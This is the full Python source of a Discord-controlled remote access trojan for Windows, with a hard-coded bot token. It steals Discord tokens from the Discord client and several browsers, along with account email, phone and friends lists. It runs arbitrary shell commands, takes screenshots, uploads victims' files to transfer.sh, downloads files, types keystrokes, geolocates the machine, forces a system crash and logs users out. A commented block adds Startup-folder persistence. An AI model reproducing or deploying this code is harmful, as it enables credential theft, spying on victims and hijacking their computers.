import ctypes
import ctypes.wintypes
import json
import os
import os.path
import time
import urllib.request
from base64 import b64decode
from json import loads
from os.path import join, exists
from re import findall
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen

import discord
import pyautogui
import requests
from discord import *
from discord.utils import get

global ping_on_startup
global token
global guild_iD
guild_iD = "984582818489331732"
# guild id here
token = "MTAwODQ5Nzk3MzkwNDI4MTc0Mg.Gt4iqj.eAYKAc7pTrFD-rI4kZ4Kl2ggRKBZ12j9t9bKZs"
# Bot Token Here Obviously
# Bot needs all intents
ping_on_startup = True
# if the bot should ping you when an infected user starts the File

"""
path = f"%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows.pyw" % getenv("userprofile")
if not exists(path):
	copy(__file__, path)
	startfile(path)
"""


class Control(discord.Client):
	def __init__(self):
		super().__init__(intents=discord.Intents.all())
		self.tree = app_commands.CommandTree(self)

	async def setup_hook(self):
		self.tree.copy_global_to(guild=discord.Object(id=int(guild_iD)))
		await self.tree.sync(guild=discord.Object(id=int(guild_iD)))


bot = Control()


@bot.event
async def on_ready():
	# print(f"logged in as [{bot.user}]")
	username = os.getenv("username")
	for guild in bot.guilds:
		channel = get(guild.text_channels, name="d")
		if ping_on_startup:
			try:
				await channel.send(f"@everyone `{username}` started Control")
			except:
				pass


def filedownload(url: str, directory: str, filename: str):
	loc = directory + "\\" + filename
	try:
		output = urllib.request.urlretrieve(url, loc)
	except Exception as err:
		output = f"Error: {err}"
	return output


def delete(filelocation: str):
	filelocation = filelocation.casefold().replace("%user%", os.getenv("username"))
	filelocation = filelocation.casefold().replace("%username%", os.getenv("username"))
	if exists(filelocation):
		os.remove(filelocation)
		output = f"File `{filelocation}` deleted"
	else:
		output = f"File `{filelocation}` not found"
	return output


def transfer(filelocation: str):
	filelocation = filelocation.casefold().replace("%user%", os.getenv("username"))
	filelocation = filelocation.casefold().replace("%username%", os.getenv("username"))

	if exists(filelocation):
		fileToUpload = {"file": (filelocation, open(filelocation, mode='rb'))}
		r = requests.post("https://transfer.sh/", files=fileToUpload)
		output = r.text
	else:
		output = f"File {filelocation} not found"
	return output


def doScreenshot():
	name = time.strftime("%Y%m%d-%H%M%S.jpg")
	path = join(os.getenv("TEMP"), name)
	pyautogui.screenshot(path)
	return name, path


def ListDir(directory):
	s = ""
	dirToList = directory
	if exists(dirToList):
		ListedDir = os.listdir(dirToList)
		for i in ListedDir:
			s += f" -> `{i}`\n"
	else:
		s = f"Directory `{dirToList}` not found"
	return s


def victimtype(toPress: str):
	wrote = []
	args = toPress.casefold().split("enter")
	for i in args:
		pyautogui.typewrite(i)
		wrote.append(i)
		time.sleep(0.2)
		pyautogui.press('enter')
		time.sleep(0.2)
	return f"Wrote `{wrote}`"


def getTasklist():
	temp = (os.getenv('TEMP'))
	t = os.popen("tasklist").read()
	with open(f"temp\\tasklist.txt", "w") as f:
		f.write(t)
	f.close()
	return f"{temp}\\tasklist.txt"


def systemInfo():
	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
	hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
	output = ""
	ip = get('https://api.ipify.org')
	envsToGet = ["LANG", "COMPUTERNAME", "COMMONPROGRAMFILES", "LOCALAPPDATA", "OS", "PROCESSOR_ARCHITECTURE",
	             "SYSTEMROOT", "TEMP", "USERDOMAIN", "USERNAME", "USERPROFILE"]
	for i in envsToGet:
		output += f"{i} = {os.getenv(i)}\n"
	import platform
	info = platform.uname()
	info_total = f"""
        System: {info.system}
	Release: {info.release}
	Machine: {info.machine}
	Processor: {info.processor}
	HWID: {hwid}
	Ip: {ip}
	"""
	with open(f"P{temp}\\systeminfo.txt", "w") as f:
		f.write(info_total)
	f.close()
	with open(f"{temp}\\environmentalVariables.txt", "w") as f:
		f.write(output)
	f.close()

	return f"{temp}\\systeminfo.txt", f"{temp}\\environmentalVariables.txt"


global temp
temp = os.getenv('TEMP')


def searchFile(directory: str, keyword: str):
	directory = directory.casefold().replace("%user%", os.getenv("USERNAME"))
	directory = directory.casefold().replace("%username%", os.getenv("USERNAME"))
	if exists(directory):
		Files = os.listdir(directory)
		found_files = []
		for file in Files:
			if keyword.lower() in file.lower():
				found_files.append(file)
		if found_files:
			output = f"Found Files in `{directory}`:\n"
			for file in found_files:
				output += f" -> `{file}`\n"
		else:
			output = f"No File mayching Keyword `{keyword} in {directory} found"
		return output
	else:
		output = f"Directory `{directory}` not found"
	return output.format()


def geolocate():
	with urllib.request.urlopen("https://geolocation-db.com/json") as url:
		data = json.loads(url.read().decode())
		link = f"https://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
		link = f" successfully got Google Maps Coordinates: {link}"
		return link


def crash():
	ntdll = ctypes.windll.ntdll
	prev_value = ctypes.c_bool()
	res = ctypes.c_ulong()
	ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))

	if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
		output = "Successfully crashed machine"
	else:
		output = "Failed to crash machine"
	return output


def getDiscordData():
	LOCAL = os.getenv("LOCALAPPDATA")
	ROAMING = os.getenv("APPDATA")
	PATHS = {
		"Discord": ROAMING + "\\Discord",
		"Discord Canary": ROAMING + "\\discordcanary",
		"Discord PTB": ROAMING + "\\discordptb",
		"Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
		"Opera": ROAMING + "\\Opera Software\\Opera Stable",
		"Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
		"Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
	}

	def getHeader(token=None, content_type="application/json"):
		headers = {
			"Content-Type": content_type,
			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
		}
		if token:
			headers.update({"Authorization": token})
		return headers

	def getUserData(token):
		try:
			return loads(
				urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
		except:
			pass

	def getT0k3ns(path):
		path += "\\Local Storage\\leveldb"
		tokens = []
		for file_name in os.listdir(path):
			if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
				continue
			for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
				for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
					for token in findall(regex, line):
						tokens.append(token)
		return tokens

	def getFriends(token):
		try:
			return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
			                             headers=getHeader(token))).read().decode())
		except:
			pass

	def main():
		working = []
		checked = []
		working_ids = []
		pc_username = os.getenv("UserName")
		pc_name = os.getenv("COMPUTERNAME")

		for platform, path in PATHS.items():
			if not os.path.exists(path):
				continue
			for T0K3N in getT0k3ns(path):
				if T0K3N in checked:
					continue
				checked.append(T0K3N)
				uid = None
				if not T0K3N.startswith("mfa."):
					try:
						uid = b64decode(T0K3N.split(".")[0].encode()).decode()
					except:
						pass
					if not uid or uid in working_ids:
						continue
				user_data = getUserData(T0K3N)
				if not user_data:
					continue
				working_ids.append(uid)
				working.append(T0K3N)
				username = user_data["username"] + "#" + str(user_data["discriminator"])
				user_id = user_data["id"]
				email = user_data.get("email")
				phone = user_data.get("phone")
				nitro = bool(user_data.get("premium_type"))
				info = f"####Ma#i##l#: {email}\n#P#h##o##ne: ##{phone}\n#N#i#t#r3###o##: {nitro}\n#U#s#e#r#n#a#m#e: {pc_username}\n#P#C# #N#a#m####e: {pc_name}\nT##0##k##e##n Location: {platform}\nT##3#o##k##e##n #: {T0K3N}\nUsername: {username} ({user_id})\n\nUser Data: {user_data}\n\nFriends: {getFriends(T0K3N)}"
				info = info.replace("#", "")
				temp = os.getenv("TEMP")
				with open(f"{temp}\\discordinfo.txt", "w") as f:
					f.write(info)
				f.close()

	main()
	return f"{temp}\\discordinfo.txt"


@bot.tree.command(name="discordinfo",
                  description="get victim's discord info")
async def discordinfo(interaction: discord.Interaction):
	await interaction.response.send_message(f"getting discordInfo...")
	getDiscordData()
	await interaction.channel.send(file=discord.File(f"{temp}\\discordinfo.txt"))
	os.remove(f"{temp}\\discordinfo.txt")


@bot.tree.command(name="crash",
                  description="crash your victim's computer")
async def geo(interaction: discord.Interaction):
	await interaction.response.send_message(f"crashing machine...")
	await interaction.channel.send(crash())


@bot.tree.command(name="cmd", description="execute command in cmd")
async def cmd(interaction: discord.Interaction, command: str):
	await interaction.response.send_message(f"executing command `{command}`...")
	x = ""
	try:
		x = os.popen(command).read()
	except Exception as err:
		await interaction.channel.send(f"Error: {err}")
	if x == "":
		await interaction.channel.send(f"Command `{command}` doesn't return anything/isn't valid")
	else:
		await interaction.channel.send(f"command `{command}` returned:\n ```{x}```")


@bot.tree.command(name="listdir", description="list all files in a specific directory (use %user% instead of username)")
async def listdir(interaction: discord.Interaction, directory: str):
	directory = directory.casefold().replace("%user%", os.getenv("USERNAME"))
	directory = directory.casefold().replace("%USERNAME%", os.getenv("USERNAME"))
	await interaction.response.send_message(f"displaying `{directory}`...")
	await interaction.channel.send(f"{ListDir(directory)}")


@bot.tree.command(name="write", description="make your victim write something")
async def typing(interaction: discord.Interaction, message: str):
	await interaction.response.send_message(f"typing `{message}`...")
	await interaction.channel.send(victimtype(message))


@bot.tree.command(name="tasklist",
                  description="list all running processes")
async def tasklist(interaction: discord.Interaction):
	await interaction.response.send_message(f"listing all tasks...")
	await interaction.channel.send(file=discord.File(getTasklist()))
	os.remove(getTasklist())


@bot.tree.command(name="geolocate",
                  description="get the geolocation of the of the machine with google maps (not very precise)")
async def geo(interaction: discord.Interaction):
	await interaction.response.send_message(f"getting geolocation by ip...")
	await interaction.channel.send(geolocate())


@bot.tree.command(name="systeminfo",
                  description="attempt to get system info")
async def sysinfo(interaction: discord.Interaction):
	await interaction.response.send_message(f"getting system info...")
	systempath, envpath = systemInfo()
	await interaction.channel.send(file=discord.File(systempath))
	await interaction.channel.send(file=discord.File(envpath))
	os.remove(systempath)
	os.remove(envpath)


@bot.tree.command(name="screenshot", description="get a screenshot of the victim")
async def scr(interaction: discord.Interaction):
	name, path = doScreenshot()
	await interaction.response.send_message(f"Screenshot taken, sending...")
	await interaction.channel.send(file=discord.File(path))
	os.remove(path)


@bot.tree.command(name="upload",
                  description="upwnload a file of the victim to transfer.sh (use %user% instead of username)")
async def upload(interaction: discord.Interaction, location: str):
	await interaction.response.send_message(f"searching for `{location}`...")
	await interaction.channel.send(transfer(location))


@bot.tree.command(name="search",
                  description="search for a file on the victim's pc pc (use %user% instead of username)")
async def search(interaction: discord.Interaction, location: str, keyword: str):
	await interaction.response.send_message(f"searching for keyword `{keyword}` in `{location}`...")
	await interaction.channel.send(searchFile(location, keyword))


@bot.tree.command(name="delete_file", description="delete a file of the victim (use %user% instead of username)")
async def deleteFile(interaction: discord.Interaction, locinput: str):
	await interaction.response.send_message(f"searching for `{locinput}`...")
	await interaction.channel.send(delete(locinput))


@bot.tree.command(name="download",
                  description="download a file on the machine of the victim (needs to be raw [eg. github raw))")
async def downloadFile(interaction: discord.Interaction, targeturl: str, directory: str, filename: str):
	await interaction.response.send_message(f"searching for `{targeturl}`...")
	await interaction.channel.send(filedownload(targeturl, directory, filename))


@bot.tree.command(name="log_out", description="log the victim out of their User account")
async def scr(interaction: discord.Interaction):
	os.system("shutdown /l /f")
	await interaction.response.send_message(f"Successfully logged out")


bot.run(token=token)
